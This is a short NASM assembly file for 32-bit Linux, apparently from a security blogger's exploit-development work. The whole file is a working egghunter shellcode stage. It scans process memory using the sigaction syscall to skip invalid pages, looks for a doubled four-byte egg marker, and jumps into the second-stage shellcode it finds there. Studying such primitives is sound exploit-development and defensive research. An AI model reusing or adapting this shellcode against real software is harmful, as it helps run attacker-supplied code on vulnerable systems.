; Filename: egghunter.nasm
; Author:  Bohan Zhang
; Website:  https://bohansec.com/
;
;
; Purpose: Hunting the egg flag in memory to execute second staged shellcode

global _start			

section .text
_start:

loop_inc_page:
	or cx,0xfff ;Add PAGE_SIZE-1 to ecx
loop_inc_one:
	inc ecx ;Increment our pointer by one
loop_check:
	push byte +0x43 ;syscall number for sigaction
	pop eax ;put the number 0x43 on eax
	int 0x80
	cmp al,0xf2 ;did we get EFAULT?
loop_check_8_valid: 
	jz loop_inc_page ;Yes, invalid ptr, go to the next page
is_egg:
	mov eax,0x50905090 ;the egg is \x90\x50\x90\x50
	mov edi,ecx ;set edi to the pointer we validated
	scasd ;compare dword in edi to eax
	jnz loop_inc_one ;No match? Increment the pointer by one
	scasd ;Compare the dword in edi to eax again (which is now edi + 4)
	jnz loop_inc_one ;No match? Increment the pointer by one
matched:
	jmp edi ;jump to shellcode
